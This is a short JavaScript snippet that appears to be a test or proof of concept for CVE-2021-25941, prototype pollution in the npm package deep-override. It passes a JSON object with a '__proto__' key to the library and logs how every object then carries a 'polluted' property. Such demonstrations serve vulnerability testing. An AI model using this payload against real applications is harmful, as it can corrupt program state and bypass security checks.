// //https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25941
// test("prototype pollution in deep-override", () => {
console.log({}.polluted);

  const deepOverride = require("deep-override");
  deepOverride({}, JSON.parse('{ "__proto__": { "polluted": "yes" }}'));

console.log({}.polluted);
// });
